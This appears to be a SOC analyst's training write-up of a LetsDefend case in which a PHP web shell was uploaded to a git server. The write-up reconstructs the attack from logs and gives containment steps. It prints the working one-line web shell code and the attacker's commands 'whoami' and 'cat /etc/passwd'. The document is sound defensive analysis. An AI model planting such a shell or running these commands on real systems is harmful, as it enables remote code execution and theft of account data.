# 	SOC128 - Malicious File Upload Attempt

## Executive Summary

On February 22, 2021, the Security Operations Center (SOC) detected a malicious file upload to the **gitServer** (172.16.20.4). The investigation confirmed that an external attacker from the IP address **49.234.71.65** successfully exploited a file upload vulnerability to place a PHP web shell (`phpshell.php`) on the server. Log analysis and endpoint data provide definitive proof that the attacker then used this web shell to achieve Remote Code Execution (RCE), running commands to perform reconnaissance and exfiltrate the `/etc/passwd` file. The server is fully compromised. This is a **True Positive** for a critical security breach.

## Incident Details

The initial alert was triggered by the detection of a known malicious file being created on the web server:

<img width="1560" height="576" alt="image" src="https://github.com/user-attachments/assets/cdcc091c-14eb-43ff-a484-9cd36ccfc8d2" />

| | |
| :--- | :--- |
| **Date of Incident**| February 22, 2021 |
| **Attacker IP**| 49.234.71.65 |
| **Destination Host**| gitServer (172.16.20.4) |
| **Malware File**| `phpshell.php` |
| **File Hash (MD5)**| 756215a64e7d43153298f1a5a5fde295 |
| **Attack Type**| Web Shell / Remote Code Execution |
| **Case Link**| *([Case link](https://app.letsdefend.io/case-management/casedetail/sohankanna/62))* |

## Investigation and Analysis

### 1. The Weapon: Analysis of the PHP Web Shell

The investigation began by analyzing the malicious file, `phpshell.php`. Threat intelligence from VirusTotal confirmed it was malicious with 34 detections. A static analysis of the file revealed a simple yet highly effective one-line PHP web shell.

<img width="1269" height="772" alt="image" src="https://github.com/user-attachments/assets/724ed9d1-3995-4520-a97f-73e773a39910" />

**Code:** `<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>`

*   **Functionality:** This code checks if a web request (GET or POST) contains a parameter named `cmd`.
*   If it does, the `system()` function takes the value of the `cmd` parameter and executes it as a command on the underlying operating system.
*   The output of the command is then sent back to the attacker in the web response. This gives the attacker a direct, interactive command line on the compromised server.

### 2. Reconstructing the Attack Chain via Log Analysis

Web server logs clearly show the step-by-step process the attacker used to compromise the server.

*   **Stage 1: Initial Upload:** The attacker first accessed `upload.php`, which is the likely vulnerable component that allowed them to upload the `phpshell.php` file onto the server.
    <img width="643" height="247" alt="image" src="https://github.com/user-attachments/assets/436be18b-d41f-466c-a0bb-c3f164e33156" />

*   **Stage 2: Execution and Reconnaissance:** The attacker immediately began interacting with their newly uploaded web shell. Their first command was `whoami`, a common reconnaissance step to confirm the shell is working and to identify the user context of the web server process.
    <img width="655" height="259" alt="image" src="https://github.com/user-attachments/assets/86a75c13-7afd-4439-87cf-b5747f28c062" />

*   **Stage 3: Data Exfiltration:** The attacker then escalated to data theft, exfiltrating the contents of the `/etc/passwd` file. This file contains a list of all user accounts on the server.
    <img width="645" height="243" alt="image" src="https://github.com/user-attachments/assets/3c7964a8-16af-4426-9cfb-7a8b025d8832" />

### 3. Confirmation of Success via Endpoint Logs

Endpoint security logs provide the definitive proof that the attack was successful. The logs show that the web server process spawned a shell (`sh`) to execute the exact commands (`whoami`, `cat /etc/passwd`) that the attacker sent via the web shell's `cmd` parameter. This confirms the attacker achieved RCE.

<img width="1186" height="272" alt="image" src="https://github.com/user-attachments/assets/b4b9ec89-6e87-4249-a2a5-18d9b64eced1" />

### 4. Threat Intelligence

The attacker's IP `49.234.71.65` is a known malicious actor, with nearly 2,000 reports on AbuseIPDB, originating from China.

<img width="1637" height="763" alt="image" src="https://github.com/user-attachments/assets/926bef50-14ea-48f6-81fe-f9c0aac48140" />

## Skills and Tools Utilized

*   **Tools Used:** SIEM, EDR, Web Server Logs, VirusTotal, AbuseIPDB, Static Analysis
*   **Skills Demonstrated:** Web Shell Analysis, RCE Triage, Log Correlation, Attack Chain Reconstruction.

## Playbook Solution: Incident Classification

*   **Analyze Malware:** **Malicious.** The file is a PHP web shell.
*   **Was C2 Requested?** **Yes, Accessed.** The attacker successfully interacted with the web shell.
*   **Was Malware Quarantined?** **No.** The file was allowed and executed.
*   **Incident Classification:** **True Positive.**

## Conclusion and Recommendations

The alert for SOC128 was a **true positive** for a critical and successful web shell attack. An attacker exploited a file upload vulnerability to gain RCE on the **gitServer**. The server is fully compromised and under attacker control, who has already begun exfiltrating sensitive system files.

**Recommendations:**

1.  **CONTAINMENT - Isolate Host Immediately:** Disconnect the **gitServer** (172.16.20.4) from the network to terminate the attacker's access and prevent further damage.
2.  **ESCALATE:** Immediately escalate this incident to the Tier 2/Incident Response (IR) team for a full forensic investigation.
3.  **ERADICATION:**
    *   The IR team must identify and remove the `phpshell.php` file and any other backdoors the attacker may have installed.
    *   The vulnerability in `upload.php` must be identified and patched immediately.
4.  **INVESTIGATION:** A full forensic analysis is required to determine the full scope of the compromise. This includes checking for persistence mechanisms, lateral movement, and what other data may have been exfiltrated. All credentials on the server should be considered compromised.
5.  **RECOVERY:** Due to the severity of the compromise, the server should be rebuilt from a known-good, trusted image after the vulnerability has been patched.
6.  **BLOCK INDICATORS:** Block the attacker's IP address `49.234.71.65` at the network firewall. Add the hash of the web shell (`756215a64e7d43153298f1a5a5fde295`) to the EDR blocklist.
